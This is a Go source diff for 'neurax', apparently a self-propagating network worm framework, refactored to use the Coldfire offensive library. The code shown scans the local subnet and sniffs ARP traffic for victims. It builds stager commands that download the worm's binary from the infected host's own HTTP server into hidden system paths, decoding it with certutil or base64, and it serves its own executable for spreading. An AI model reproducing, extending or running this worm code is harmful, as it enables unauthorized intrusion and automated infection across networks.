@@ -2,10 +2,8 @@ package neurax
 
 import (
 	"bytes"
-	"encoding/base64"
 	"fmt"
 	"io/ioutil"
-	"math/rand"
 	"net"
 	"net/http"
 	"os"
@@ -19,9 +17,10 @@ import (
 	"github.com/google/gopacket/layers"
 	"github.com/google/gopacket/pcap"
 	"github.com/mostlygeek/arp"
+	coldfire "github.com/redcode-labs/Coldfire"
 )
 
-type __neurax_config struct {
+type __NeuraxConfig struct {
 	stager           string
 	port             int
 	knock_port       string
@@ -40,17 +39,17 @@ type __neurax_config struct {
 	required_port    int
 }
 
-var neurax_config = __neurax_config{
+var NeuraxConfig = __NeuraxConfig{
 	stager:           "random",
-	port:             random_int(2222, 9999),
-	knock_port:       strconv.Itoa(random_int(2222, 9999)),
+	port:             coldfire.RandomInt(2222, 9999),
+	knock_port:       strconv.Itoa(coldfire.RandomInt(2222, 9999)),
 	required_port:    0,
 	prevent_reinfect: true,
-	local_ip:         get_local_ip(),
+	local_ip:         coldfire.GetLocalIp(),
 	path:             "random",
 	file_name:        "random",
 	platform:         runtime.GOOS,
-	cidr:             get_local_ip() + "/24",
+	cidr:             coldfire.GetLocalIp() + "/24",
 	scan_passive:     false,
 	scan_timeout:     2,
 	read_arp_cache:   false,
@@ -59,113 +58,7 @@ var neurax_config = __neurax_config{
 	base64:           false,
 }
 
-func contains_any(str string, elements []string) bool {
-	for element := range elements {
-		e := elements[element]
-		if strings.Contains(str, e) {
-			return true
-		}
-	}
-	return false
-}
-
-func exit_on_error(err error) {
-	if err != nil {
-		os.Exit(0)
-	}
-}
-
-func remove_from_slice(slice []string, elem string) []string {
-	res := []string{}
-	for _, e := range slice {
-		if e != elem {
-			res = append(res, elem)
-		}
-	}
-	return res
-}
-
-func ip_increment(ip net.IP) {
-	for j := len(ip) - 1; j >= 0; j-- {
-		ip[j]++
-		if ip[j] > 0 {
-			break
-		}
-	}
-}
-
-func is_open(target string, port int) bool {
-	ps := portscanner.NewPortScanner(target, time.Duration(10)*time.Second, 3)
-	opened_ports := ps.GetOpenedPort(port-1, port+1)
-	if len(opened_ports) != 0 {
-		return true
-	}
-	return false
-}
-
-func expand_cidr(cidr string) ([]string, error) {
-	ip, ipnet, err := net.ParseCIDR(cidr)
-	if err != nil {
-		return nil, err
-	}
-
-	var ips []string
-	for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); ip_increment(ip) {
-		ips = append(ips, ip.String())
-	}
-
-	lenIPs := len(ips)
-	switch {
-	case lenIPs < 2:
-		return ips, nil
-	default:
-		return ips[1 : len(ips)-1], nil
-	}
-}
-
-func random_string(n int) string {
-	rand.Seed(time.Now().UnixNano())
-	var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
-	b := make([]rune, n)
-	for i := range b {
-		b[i] = letters[rand.Intn(len(letters))]
-	}
-	return string(b)
-}
-
-func random_int(min int, max int) int {
-	rand.Seed(time.Now().UnixNano())
-	return rand.Intn(max-min) + min
-}
-
-func b64d(str string) string {
-	raw, _ := base64.StdEncoding.DecodeString(str)
-	return fmt.Sprintf("%s", raw)
-}
-
-func b64e(str string) string {
-	return base64.StdEncoding.EncodeToString([]byte(str))
-}
-
-func get_local_ip() string {
-	dns, err := net.Dial("udp", "8.8.8.8:80")
-	exit_on_error(err)
-	defer dns.Close()
-	ip := dns.LocalAddr().(*net.UDPAddr).IP
-	return fmt.Sprintf("%d.%d.%d.%d", ip[0], ip[1], ip[2], ip[3])
-}
-
-func random_select_str(list []string) string {
-	rand.Seed(time.Now().UnixNano())
-	return list[rand.Intn(len(list))]
-}
-
-func random_select_str_nested(list [][]string) []string {
-	rand.Seed(time.Now().UnixNano())
-	return list[rand.Intn(len(list))]
-}
-
-func neurax_stager() string {
+func NeuraxStager() string {
 	stagers := [][]string{}
 	stager := []string{}
 	paths := []string{}
@@ -182,72 +75,72 @@ func neurax_stager() string {
 	linux_save_paths := []string{"/tmp/", "/lib/", "/home/",
 		"/etc/", "/usr/", "/usr/share/"}
 	windows_save_paths := []string{`C:\$recycle.bin\`, `C:\ProgramData\MicrosoftHelp\`}
-	switch neurax_config.platform {
+	switch NeuraxConfig.platform {
 	case "windows":
 		stagers = windows_stagers
 		paths = windows_save_paths
-		if neurax_config.base64 {
+		if NeuraxConfig.base64 {
 			b64_decoder = "certutil -decode SAVE_PATH/FILENAME SAVE_PATH/FILENAME;"
 		}
 	case "linux", "darwin":
 		stagers = linux_stagers
 		paths = linux_save_paths
-		if neurax_config.base64 {
+		if NeuraxConfig.base64 {
 			b64_decoder = "cat SAVE_PATH/FILENAME|base64 -d > SAVE_PATH/FILENAME;"
 		}
 	}
-	if neurax_config.stager == "random" {
-		stager = random_select_str_nested(stagers)
+	if NeuraxConfig.stager == "random" {
+		stager = coldfire.RandomSelectStrNested(stagers)
 	} else {
 		for s := range stagers {
 			st := stagers[s]
-			if st[0] == neurax_config.stager {
+			if st[0] == NeuraxConfig.stager {
 				stager = st
 			}
 		}
 	}
 	selected_stager_command := stager[1]
-	if neurax_config.path == "random" {
-		neurax_config.path = random_select_str(paths)
+	if NeuraxConfig.path == "random" {
+		NeuraxConfig.path = coldfire.RandomSelectStr(paths)
 	}
-	if neurax_config.file_name == "random" && neurax_config.platform == "windows" {
-		neurax_config.file_name += ".exe"
+	if NeuraxConfig.file_name == "random" && NeuraxConfig.platform == "windows" {
+		NeuraxConfig.file_name += ".exe"
 	}
-	url := fmt.Sprintf("http://%s:%d/%s", neurax_config.local_ip, neurax_config.port, neurax_config.file_name)
+	url := fmt.Sprintf("http://%s:%d/%s", NeuraxConfig.local_ip, NeuraxConfig.port, NeuraxConfig.file_name)
 	selected_stager_command = strings.Replace(selected_stager_command, "URL", url, -1)
-	selected_stager_command = strings.Replace(selected_stager_command, "FILENAME", neurax_config.file_name, -1)
-	selected_stager_command = strings.Replace(selected_stager_command, "SAVE_PATH", neurax_config.path, -1)
+	selected_stager_command = strings.Replace(selected_stager_command, "FILENAME", NeuraxConfig.file_name, -1)
+	selected_stager_command = strings.Replace(selected_stager_command, "SAVE_PATH", NeuraxConfig.path, -1)
 	selected_stager_command = strings.Replace(selected_stager_command, "B64", b64_decoder, -1)
 	return selected_stager_command
 }
 
-func neurax_server() {
-	if neurax_config.prevent_reinfect {
-		go net.Listen("tcp", "0.0.0.0:"+neurax_config.knock_port)
+func NeuraxServer() {
+	if NeuraxConfig.prevent_reinfect {
+		go net.Listen("tcp", "0.0.0.0:"+NeuraxConfig.knock_port)
 	}
 	data, _ := ioutil.ReadFile(os.Args[0])
-	if neurax_config.base64 {
-		data = []byte(b64e(string(data)))
+	if NeuraxConfig.base64 {
+		data = []byte(coldfire.B64E(string(data)))
 	}
-	addr := fmt.Sprintf(":%d", neurax_config.port)
+	addr := fmt.Sprintf(":%d", NeuraxConfig.port)
 	go http.ListenAndServe(addr, http.HandlerFunc(func(rw http.ResponseWriter, r *http.Request) {
-		http.ServeContent(rw, r, neurax_config.file_name, time.Now(), bytes.NewReader(data))
+		http.ServeContent(rw, r, NeuraxConfig.file_name, time.Now(), bytes.NewReader(data))
 	}))
 }
 
 func is_host_active(target string) bool {
-	ps := portscanner.NewPortScanner(target, time.Duration(neurax_config.scan_timeout)*time.Second, neurax_config.threads)
 	first := 19
 	last := 300
-	if neurax_config.full_range {
+	if NeuraxConfig.full_range {
 		last = 65535
 	}
+	ps := portscanner.NewPortScanner(target, time.Duration(NeuraxConfig.scan_timeout)*time.Second, NeuraxConfig.threads)
 	opened_ports := ps.GetOpenedPort(first, last)
-	if len(opened_ports) != 0 && !is_open(target, 7123) {
-		if neurax_config.required_port == 0 {
+	if len(opened_ports) != 0 && !coldfire.PortscanSingle(target, 7123) {
+		if NeuraxConfig.required_port == 0 {
 			return true
 		} else {
-			if is_open(target, neurax_config.required_port) {
+			if coldfire.PortscanSingle(target, NeuraxConfig.required_port) {
 				return true
 			}
 		}
@@ -255,15 +148,15 @@ func is_host_active(target string) bool {
 	return false
 }
 
-func neurax_scan(c chan string) {
-	if neurax_config.scan_passive {
+func NeuraxScan(c chan string) {
+	if NeuraxConfig.scan_passive {
 		var snapshot_len int32 = 1024
 		var timeout time.Duration = 500000 * time.Second
 		devices, err := pcap.FindAllDevs()
-		exit_on_error(err)
+		coldfire.ExitOnError(err)
 		for _, device := range devices {
 			handler, err := pcap.OpenLive(device.Name, snapshot_len, false, timeout)
-			exit_on_error(err)
+			coldfire.ExitOnError(err)
 			handler.SetBPFFilter("arp")
 			defer handler.Close()
 			packetSource := gopacket.NewPacketSource(handler, handler.LinkType())
@@ -273,10 +166,10 @@ func neurax_scan(c chan string) {
 					ip, _ := ip_layer.(*layers.IPv4)
 					source := fmt.Sprintf("%s", ip.SrcIP)
 					destination := fmt.Sprintf("%s", ip.DstIP)
-					if source != get_local_ip() {
+					if source != coldfire.GetLocalIp() {
 						c <- source
 					}
-					if destination != get_local_ip() {
+					if destination != coldfire.GetLocalIp() {
 						c <- destination
 					}
 				}
@@ -284,16 +177,16 @@ func neurax_scan(c chan string) {
 		}
 	} else {
 		targets := []string{}
-		if neurax_config.read_arp_cache {
+		if NeuraxConfig.read_arp_cache {
 			for ip, _ := range arp.Table() {
 				targets = append(targets, ip)
 			}
 		}
-		full_addr_range, _ := expand_cidr(neurax_config.cidr)
+		full_addr_range, _ := coldfire.ExpandCidr(NeuraxConfig.cidr)
 		for _, addr := range full_addr_range {
 			targets = append(targets, addr)
 		}
-		targets = remove_from_slice(targets, get_local_ip())
+		targets = coldfire.RemoveFromSlice(targets, coldfire.GetLocalIp())
 		for _, target := range targets {
 			if is_host_active(target) {
 				c <- target
